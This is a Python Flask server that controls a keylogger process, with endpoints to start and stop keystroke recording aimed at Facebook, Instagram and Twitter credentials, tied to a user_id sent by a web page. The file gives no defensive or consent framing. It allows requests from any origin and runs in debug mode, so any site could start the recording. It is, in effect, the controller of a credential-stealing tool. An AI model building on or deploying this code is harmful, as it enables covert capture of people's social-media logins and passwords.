import multiprocessing
from flask import Flask, jsonify, request
from flask_cors import CORS
from tools.keylogger import Keylogger
from base.displayer import CredentialType

# Global dictionary to track the Keylogger process
keylogger_process = {}


def execute_keylogger(platform_id: str, user_id: str):
    """Start recording keystrokes for the given platform in a separate process."""
    print("ID passed to the keylogger" + user_id)
    keylogger_instance = Keylogger(user_id)
    account_number = 1
    if platform_id == "0":
        keylogger_instance.start_recording(
            CredentialType.FACEBOOK, int(account_number), running_through_flask=True
        )
    elif platform_id == "1":
        keylogger_instance.start_recording(
            CredentialType.INSTAGRAM, int(account_number), running_through_flask=True
        )
    elif platform_id == "2":
        keylogger_instance.start_recording(
            CredentialType.TWITTER, int(account_number), running_through_flask=True
        )


app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}, allow_headers=["Content-Type"])


# Handle CORS preflight OPTIONS requests
@app.before_request
def handle_preflight():
    if request.method == "OPTIONS":
        response = jsonify({"message": "CORS preflight passed"})
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        return response


@app.route("/start-server", methods=["POST"])
def start_server():
    """Start the keylogger in a separate process and store its reference."""
    print("Received start recording request from page")

    data = request.get_json()
    platform_id = str(data.get("platform_id"))
    print("Platform ID in request is:", platform_id)

    # Check if a keylogger process is already running, stop it first
    if "keylogger" in keylogger_process and keylogger_process["keylogger"].is_alive():
        print("Stopping previous keylogger process before starting a new one")
        keylogger_process["keylogger"].terminate()
        keylogger_process[
            "keylogger"
        ].join()  # Ensure the process has completely stopped
    # Grab the uer_id from the sqlite cache which should be set on page load (so it should be there when this endpoint is hit)
    user_id = str(data.get("user_id"))
    # Start a new keylogger process
    p1 = multiprocessing.Process(
        target=execute_keylogger,
        args=(
            platform_id,
            user_id,
        ),
    )
    p1.start()

    keylogger_process["keylogger"] = p1  # Store process reference

    print("Started keylogger with PID:", p1.pid)
    return jsonify({"message": "Keylogger started"}), 200


@app.route("/end-server", methods=["POST"])
def end_server():
    """Terminate only the keylogger process without stopping the Flask server."""
    if "keylogger" in keylogger_process and keylogger_process["keylogger"].is_alive():
        print(
            "Terminating keylogger process with PID:",
            keylogger_process["keylogger"].pid,
        )
        keylogger_process["keylogger"].terminate()
        keylogger_process["keylogger"].join()
        del keylogger_process["keylogger"]  # Remove the process reference

        return jsonify({"message": "Keylogger process terminated"}), 200
    else:
        return jsonify({"message": "No keylogger process found"}), 400


if __name__ == "__main__":
    app.run(debug=True)
